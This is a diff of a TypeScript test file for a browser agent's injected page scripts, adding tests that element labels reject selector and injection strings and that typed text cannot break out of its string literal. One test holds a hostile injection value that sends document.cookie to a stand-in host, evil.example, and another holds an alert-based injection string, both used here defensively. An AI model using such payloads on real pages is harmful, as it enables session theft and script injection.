@@ -1,6 +1,6 @@
 import { runInNewContext } from 'node:vm'
 import { describe, expect, it } from 'vitest'
-import { clickScript, describeFailure, existsScript, fileInputScript, fillScript, pageReadingScript, signInScript, type PageReading } from './page-scripts'
+import { clickScript, describeFailure, existsScript, fileInputScript, fillScript, locateScript, mouseSeenScript, mouseWatchScript, pageReadingScript, prepareTypingScript, scriptClickScript, selectOptionScript, setValueScript, signInScript, typedScript, type PageReading } from './page-scripts'
 
 // A tiny DOM: enough to run the injected scripts and observe what they do.
 class FakeEvent {
@@ -240,5 +240,67 @@ describe('pageReadingScript: what a person can read, never what they typed', () 
     const out = read([{ innerText: 'm'.repeat(500), rect: box }], 'x'.repeat(5000))
     expect(out.text).toHaveLength(1500)
     expect(out.alerts[0]).toHaveLength(200)
+  })
+})
+
+describe('step scripts of the browser agent (DEC-017)', () => {
+  it('only ever look for an element by a label, never by a selector the engine could write', () => {
+    for (const make of [locateScript, prepareTypingScript, scriptClickScript]) {
+      expect(() => make('e12')).not.toThrow()
+      expect(() => make('input[name=x]')).toThrow(/Not an element label/)
+      expect(() => make('e1"]);alert(1);//')).toThrow(/Not an element label/)
+    }
+    expect(() => typedScript('e1; x', 'a')).toThrow(/Not an element label/)
+    expect(() => setValueScript('', 'a')).toThrow(/Not an element label/)
+    expect(() => selectOptionScript('../e1', 'a')).toThrow(/Not an element label/)
+  })
+
+  it('are valid scripts, and carry the text as a string literal that cannot break out', () => {
+    const hostile = '"); fetch("https://evil.example/?"+document.cookie); ("'
+    for (const script of [locateScript('e1'), prepareTypingScript('e1'), typedScript('e1', hostile), setValueScript('e1', hostile), selectOptionScript('e1', hostile), scriptClickScript('e1')]) {
+      expect(() => new Function(`return ${script}`)).not.toThrow()
+    }
+    expect(setValueScript('e1', hostile)).toContain(JSON.stringify(hostile))
+  })
+
+  it('count the real mouse presses a page receives, and ignore the ones a script makes', () => {
+    const listeners: ((e: { isTrusted: boolean }) => void)[] = []
+    const window: Record<string, unknown> = { addEventListener: (_type: string, fn: (e: { isTrusted: boolean }) => void) => listeners.push(fn) }
+    const run = (script: string): { ok: boolean } => runInNewContext(script, { window }) as { ok: boolean }
+    expect(run(mouseWatchScript())).toEqual({ ok: true })
+    expect(run(mouseSeenScript())).toEqual({ ok: false })
+    listeners[0]({ isTrusted: false })
+    expect(run(mouseSeenScript())).toEqual({ ok: false })
+    listeners[0]({ isTrusted: true })
+    expect(run(mouseSeenScript())).toEqual({ ok: true })
+    run(mouseWatchScript()) // watching again starts from zero and does not add a second listener
+    expect(listeners).toHaveLength(1)
+    expect(run(mouseSeenScript())).toEqual({ ok: false })
+  })
+
+  it('select a native option by whole text first, then by start, and report why when they cannot', () => {
+    class Option {
+      constructor(readonly textContent: string, readonly value: string) {}
+    }
+    class HTMLSelectElement {
+      disabled = false
+      value = ''
+      events: string[] = []
+      options = [new Option('January', '1'), new Option('March', '3'), new Option('May', '5'), new Option('Marchland', '9')]
+      focus(): void {}
+      dispatchEvent(e: FakeEvent): void {
+        this.events.push(e.type)
+      }
+    }
+    const run = (script: string, el: unknown): Record<string, unknown> =>
+      runInNewContext(script, { document: { querySelector: () => el, querySelectorAll: () => [el], getElementById: () => null }, HTMLSelectElement, Event: FakeEvent }) as Record<string, unknown>
+    const list = new HTMLSelectElement()
+    ;(list as unknown as { shadowRoot: null }).shadowRoot = null
+    expect(run(selectOptionScript('e4', 'march'), list)).toEqual({ ok: true })
+    expect(list.value).toBe('3')
+    expect(list.events).toEqual(['input', 'change'])
+    expect(run(selectOptionScript('e4', 'Ma'), new HTMLSelectElement())).toEqual({ ok: true })
+    expect(run(selectOptionScript('e4', 'Smarch'), new HTMLSelectElement())).toEqual({ ok: false, reason: 'no_such_option' })
+    expect(run(selectOptionScript('e4', 'x'), { shadowRoot: null })).toEqual({ ok: false, reason: 'not_a_list' })
   })
 })
